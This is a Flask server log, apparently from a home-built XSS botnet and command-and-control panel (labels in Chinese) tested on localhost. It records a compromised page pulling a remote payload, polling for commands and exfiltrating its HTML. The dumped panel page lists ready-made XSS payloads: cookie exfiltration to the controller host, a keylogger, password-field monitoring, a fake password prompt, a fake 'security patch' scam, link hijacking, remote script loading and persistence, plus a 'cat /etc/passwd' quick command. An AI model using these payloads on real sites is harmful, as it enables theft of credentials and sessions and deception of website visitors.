2025-06-26 22:41:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:10] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:16 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:16 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:16 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:16.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0054s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:16] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:16 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:16 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:16.138642
2025-06-26 22:41:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0075s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:16] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:41:17 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:41:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0019s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(document.cookie)\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var links = []; document.querySelectorAll(\\\'a\\\').forEach(function(a){ links.push(a.href); }); alert(links.join(\\\'\\\\n\\\'));\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'頁面標題: \\\' + document.title + \\\'\\\\n當前URL: \\\' + window.location.href + \\\'\\\\nUser Agent: \\\' + navigator.userAgent)\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var forms = []; document.querySelectorAll(\\\'form\\\').forEach(function(f, i){ forms.push(\\\'表單 \\\' + (i+1) + \\\': \\\' + f.action + \\\' (方法: \\\' + f.method + \\\')\\\'); }); alert(forms.join(\\\'\\\\n\\\') || \\\'無表單\\\')\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var inputs = []; document.querySelectorAll(\\\'input\\\').forEach(function(inp){ if(inp.value) inputs.push(inp.name + \\\': \\\' + inp.value); }); alert(inputs.join(\\\'\\\\n\\\') || \\\'無輸入值\\\')\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'alert(\\\'LocalStorage: \\\' + JSON.stringify(localStorage) + \\\'\\\\nSessionStorage: \\\' + JSON.stringify(sessionStorage))\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var fingerprint = { screen: screen.width + \\\'x\\\' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name).join(\\\',\\\') }; alert(JSON.stringify(fingerprint, null, 2));\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(\\\'script\\\'); script.src = \\\'http://127.0.0.1:8964/api/control/xss_payload\\\'; document.head.appendChild(script); })();\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var xhr = new XMLHttpRequest(); xhr.open(\\\'GET\\\', \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'完整頁面HTML: \\\' + document.documentElement.outerHTML.substring(0, 1000)) + \\\'&target_ip=\\\' + window.location.hostname); xhr.send();\')">竊取頁面HTML</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 完整頁面HTML: &lt;html&gt;&lt;head&gt;\n    &lt;meta charset=&#34;UTF-8&#34;&gt;\n    &lt;title&gt; My website&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;h1&gt;Hello World&lt;/h1&gt;\n    \\\n    &lt;div class=&#34;comment&#34;&gt;\n        &lt;script src=&#34;http://127.0.0.1:8964/api/control/xss_payload&#34;&gt;&lt;/script&gt;\n    &lt;div&gt;\n    \n    &lt;h2&gt;\n        &lt;form action=&#34;/&#34; method=&#34;post&#34;&gt;\n            &lt;input type=&#34;text&#34; name=&#34;comment&#34; placeholder=&#34;Enter your comment&#34;&gt;\n            &lt;button type=&#34;submit&#34;&gt;Submit&lt;/button&gt;\n        &lt;/form&gt;\n    &lt;/h2&gt;\n\n\n&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</p>\n            <p><strong>建立時間:</strong> 2025-06-26 22:41:16.132073</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:41:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:17] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 22:41:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:17] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:41:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:17] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:41:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:41:18 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
